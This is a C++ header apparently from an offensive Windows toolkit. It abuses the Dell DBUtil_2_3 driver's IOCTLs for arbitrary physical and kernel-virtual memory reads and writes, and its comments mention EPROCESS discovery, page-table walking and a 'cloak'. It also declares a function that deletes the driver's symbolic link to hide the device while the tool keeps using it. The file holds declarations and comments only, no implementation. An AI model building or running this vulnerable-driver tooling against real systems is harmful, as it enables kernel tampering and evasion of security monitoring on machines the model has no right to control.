#pragma once
#include <cstdint>
#include <cstddef>

namespace r0 {

// Physical-memory backend.
//
// The table below is the *only* place that names the device and the IOCTL
// pairs. Everything above this layer (page-table walking, EPROCESS discovery)
// is backend-agnostic, so swapping the driver is a change to this file only.
//
// The three primitives are deliberately different things:
//
//   read/write  - PHYSICAL addresses. The driver maps the range with
//                 MmMapIoSpace (uncached) and copies in or out.
//   vread/vwrite- KERNEL virtual addresses. The driver memmoves in the
//                 caller's context, so the copy goes through the normal
//                 cached mapping and stays coherent with other cores.
//
// Do not use vread for an address you have not derived from a trusted source:
// a non-present kernel VA faults inside the driver's memmove and bugchecks
// (0x50). Use the page walk (vmm::kread) for unvalidated candidates.
//
// Do not use the physical path for kernel addresses: the cached/uncached
// mismatch leaves stale lines in cores that are reading the same structure.
struct Backend {
    const wchar_t* device;      // L"\\\\.\\DBUtil_2_3"
    bool (*open)();
    void (*close)();
    bool (*read)(uint64_t pa, void* out, size_t len);         // physical
    bool (*write)(uint64_t pa, const void* in, size_t len);   // physical
    bool (*vwrite)(uint64_t va, const void* in, size_t len);  // kernel VA
    bool (*vread)(uint64_t va, void* out, size_t len);        // kernel VA
};

// Initialise the global backend. Returns false if no recognised device
// is present; caller must not use r0::pread/pwrite until init() succeeds.
bool init();
void shutdown();
bool alive();

// Install a backend directly, bypassing device discovery.
// Used by the lab mock so the whole pipeline can be exercised with no
// kernel driver present. Pass nullptr to clear.
void set_backend(const Backend* be);

// Physical read/write. Both are length-aware.
bool pread(uint64_t pa, void* buf, size_t len);
bool pwrite(uint64_t pa, const void* buf, size_t len);

// Kernel-virtual write (used by the cloak) and read.
bool vwrite(uint64_t va, const void* buf, size_t len);
bool vread(uint64_t va, void* buf, size_t len);

// Prove which half of the kernel-VA IOCTL pair is the read, before vread() is
// used on anything that matters.
//
// The probe sends a request whose payload length is zero: if the code is the
// write handler it has no bytes to write, so the call is a no-op. If it is the
// read handler it fills the output buffer from `va`, and the caller checks that
// against a known-good value (ntoskrnl's "MZ"). Returns true once proven; a
// false return means vread() must not be used.
bool vread_probe(uint64_t va, size_t len);
bool vread_ready();

// Remove the driver's symbolic link (e.g. L"\\DosDevices\\DBUtil_2_3") from
// the object directory, so CreateFile(L"\\\\.\\DBUtil_2_3") afterwards returns
// OBJECT_NAME_NOT_FOUND. The device object itself is unaffected: call this
// while the device handle is open, and I/O keeps working on that handle.
// Permanent until the driver is reloaded (i.e. reboot). Requires DELETE access
// on the link, so the caller must be elevated.
bool hide_symlink(const wchar_t* link);

} // namespace r0